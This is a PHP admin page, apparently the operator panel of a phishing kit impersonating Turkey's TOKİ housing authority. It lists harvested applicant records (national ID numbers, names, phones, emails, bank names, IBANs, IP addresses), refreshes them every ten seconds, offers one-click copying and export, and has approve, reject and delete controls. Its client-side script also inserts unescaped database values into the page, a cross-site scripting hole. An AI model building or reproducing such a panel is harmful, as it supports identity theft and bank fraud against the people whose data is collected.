<?php
session_start();

if (!isset($_SESSION['fast-admin']) || $_SESSION['fast-admin'] !== true) {
    header("Location: fast-login.php");
    exit;
}

require_once '../inc/brain.php';
date_default_timezone_set('Europe/Istanbul');

// AJAX İstekleri
if (isset($_GET['get_all_basvuru'])) {
    $basvurular = [];
    $sql = "SELECT * FROM basvuru_bilgileri ORDER BY id DESC";
    $stmt = $pdo->query($sql);
    foreach ($stmt as $row) {
        $basvurular[] = [
            'id' => $row['id'],
            'log_time' => $row['log_time'],
            'tckn' => $row['tckn'],
            'adsoyad' => $row['adsoyad'],
            'cep_telefonu' => $row['cep_telefonu'],
            'email' => $row['email'],
            'banka_adi' => $row['banka_adi'] ?? '-',
            'iban' => $row['iban'] ?? '-',
            'calisiyor_mu' => $row['calisiyor_mu'],
            'proje_adi' => $row['proje_adi'],
            'ip_address' => $row['ip_address'],
            'durum' => $row['durum']
        ];
    }
    header('Content-Type: application/json');
    echo json_encode($basvurular);
    exit;
}

if (isset($_POST['ajax_delete'])) {
    $id = intval($_POST['id']);
    $stmt = $pdo->prepare("DELETE FROM basvuru_bilgileri WHERE id = ?");
    $result = $stmt->execute([$id]);
    echo json_encode(['success' => $result]);
    exit;
}

if (isset($_POST['ajax_update_durum'])) {
    $id = intval($_POST['id']);
    $durum = $_POST['durum'];
    $stmt = $pdo->prepare("UPDATE basvuru_bilgileri SET durum = ? WHERE id = ?");
    $result = $stmt->execute([$durum, $id]);
    echo json_encode(['success' => $result]);
    exit;
}

try {
    $stmt = $pdo->query("SELECT * FROM yetkili LIMIT 1");
    $yetkili = $stmt->fetch();
    if ($yetkili) {
        $_SESSION['yetkili_id'] = $yetkili['id'];
        $kullanici_adi = $yetkili['yetkiliadi'];
    }
} catch (PDOException $e) {
    echo "Veritabanı hatası: " . $e->getMessage();
}
?>
<!DOCTYPE html>
<html lang="tr" data-bs-theme="dark">
<head>
    <meta charset="utf-8">
    <title>Marco | Başvurular</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/vendor.min.css" rel="stylesheet">
    <link href="css/app.min.css" rel="stylesheet">
    <link href="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/locale/bootstrap-table-tr-TR.min.js"></script>
    <script src="https://unpkg.com/tableexport.jquery.plugin/tableExport.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/extensions/export/bootstrap-table-export.min.js"></script>
</head>
<body>
    <div id="app" class="app">
        <?php
        include('../inc/fast-header.php');
        include('../inc/fast-sidebar.php');
        ?>
        <button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>

        <div class="app-content">
            <ul class="breadcrumb">
                <li class="breadcrumb-item"><a href="#">Fast Panel</a></li>
                <li class="breadcrumb-item active">Başvurular</li>
            </ul>

            <h1 class="page-header">TOKİ Başvuruları <small>[Detaylı Yönetim]</small></h1>
            <p>1binfo.php formundan gelen tüm başvuruları buradan görüntüleyebilir ve yönetebilirsiniz.</p>

            <style>
                .copyable-card:hover {
                    cursor: pointer;
                    text-decoration: underline dotted;
                }
                .badge {
                    font-size: 0.85em;
                }
            </style>

            <div class="panel">
                <div class="panel-body">
                    <table id="basvuruTable"
                           data-toggle="table"
                           data-search="true"
                           data-show-columns="true"
                           data-show-export="true"
                           data-pagination="true"
                           data-page-size="25"
                           data-page-list="[10, 25, 50, 100, ALL]"
                           data-locale="tr-TR">
                        <thead>
                            <tr>
                                <th data-field="id" data-sortable="true">ID</th>
                                <th data-field="log_time" data-sortable="true">Tarih</th>
                                <th data-field="tckn" data-sortable="true">TCKN</th>
                                <th data-field="adsoyad" data-sortable="true">Ad Soyad</th>
                                <th data-field="cep_telefonu">Telefon</th>
                                <th data-field="email">Email</th>
                                <th data-field="banka_adi">Banka</th>
                                <th data-field="iban">IBAN</th>
                                <th data-field="calisiyor">Çalışıyor mu?</th>
                                <th data-field="proje_adi">Proje</th>
                                <th data-field="ip_address">IP</th>
                                <th data-field="durum">Durum</th>
                                <th data-field="islem">İşlemler</th>
                            </tr>
                        </thead>
                        <tbody id="basvuruTableBody">
                            <!-- AJAX ile doldurulacak -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script>
    function loadBasvurular() {
        $.ajax({
            url: 'francis-basvuru.php?get_all_basvuru=1',
            type: 'GET',
            dataType: 'json',
            success: function(data) {
                var tbody = $('#basvuruTableBody');
                tbody.empty();

                data.forEach(function(row) {
                    var calisiyorBadge = row.calisiyor_mu == 1
                        ? '<span class="badge bg-success">Evet</span>'
                        : '<span class="badge bg-secondary">Hayır</span>';

                    var durumClass = 'secondary';
                    if (row.durum == 'Onaylandı') durumClass = 'success';
                    if (row.durum == 'Reddedildi') durumClass = 'danger';

                    var durumBadge = '<span class="badge bg-' + durumClass + '">' + row.durum + '</span>';

                    var tr = $('<tr>').append(
                        $('<td>').text(row.id),
                        $('<td>').text(row.log_time),
                        $('<td>').html('<span class="copyable-card" onclick="copyToClipboard(\'' + row.tckn + '\')">' + row.tckn + '</span>'),
                        $('<td>').text(row.adsoyad),
                        $('<td>').html('<span class="copyable-card" onclick="copyToClipboard(\'' + row.cep_telefonu + '\')">' + row.cep_telefonu + '</span>'),
                        $('<td>').html('<span class="copyable-card" onclick="copyToClipboard(\'' + row.email + '\')">' + row.email + '</span>'),
                        $('<td>').text(row.banka_adi),
                        $('<td>').html('<span class="copyable-card" onclick="copyToClipboard(\'' + row.iban + '\')">' + row.iban + '</span>'),
                        $('<td>').html(calisiyorBadge),
                        $('<td>').html('<small>' + row.proje_adi + '</small>'),
                        $('<td>').text(row.ip_address),
                        $('<td>').html(durumBadge),
                        $('<td>').html(
                            '<div class="btn-group btn-group-sm">' +
                            '<button class="btn btn-warning btn-sm" onclick="changeDurum(' + row.id + ', \'Onaylandı\')">Onayla</button>' +
                            '<button class="btn btn-danger btn-sm" onclick="changeDurum(' + row.id + ', \'Reddedildi\')">Reddet</button>' +
                            '<button class="btn btn-danger btn-sm" onclick="deleteBasvuru(' + row.id + ')"><i class="bi bi-trash"></i></button>' +
                            '</div>'
                        )
                    );

                    tbody.append(tr);
                });

                $('#basvuruTable').bootstrapTable('load', data);
            },
            error: function() {
                Swal.fire('Hata!', 'Başvurular yüklenemedi.', 'error');
            }
        });
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(function() {
            Swal.fire({
                toast: true,
                position: 'top-end',
                icon: 'success',
                title: 'Kopyalandı!',
                showConfirmButton: false,
                timer: 1500
            });
        });
    }

    function changeDurum(id, durum) {
        $.ajax({
            url: 'francis-basvuru.php',
            type: 'POST',
            data: { ajax_update_durum: 1, id: id, durum: durum },
            dataType: 'json',
            success: function(response) {
                if (response.success) {
                    Swal.fire('Başarılı!', 'Durum güncellendi.', 'success');
                    loadBasvurular();
                } else {
                    Swal.fire('Hata!', 'Durum güncellenemedi.', 'error');
                }
            }
        });
    }

    function deleteBasvuru(id) {
        Swal.fire({
            title: 'Emin misiniz?',
            text: "Bu başvuruyu silmek istediğinizden emin misiniz?",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#d33',
            cancelButtonColor: '#3085d6',
            confirmButtonText: 'Evet, sil!',
            cancelButtonText: 'İptal'
        }).then((result) => {
            if (result.isConfirmed) {
                $.ajax({
                    url: 'francis-basvuru.php',
                    type: 'POST',
                    data: { ajax_delete: 1, id: id },
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            Swal.fire('Silindi!', 'Başvuru silindi.', 'success');
                            loadBasvurular();
                        } else {
                            Swal.fire('Hata!', 'Başvuru silinemedi.', 'error');
                        }
                    }
                });
            }
        });
    }

    $(document).ready(function() {
        loadBasvurular();
        setInterval(loadBasvurular, 10000); // Her 10 saniyede bir yenile
    });
    </script>
</body>
</html>
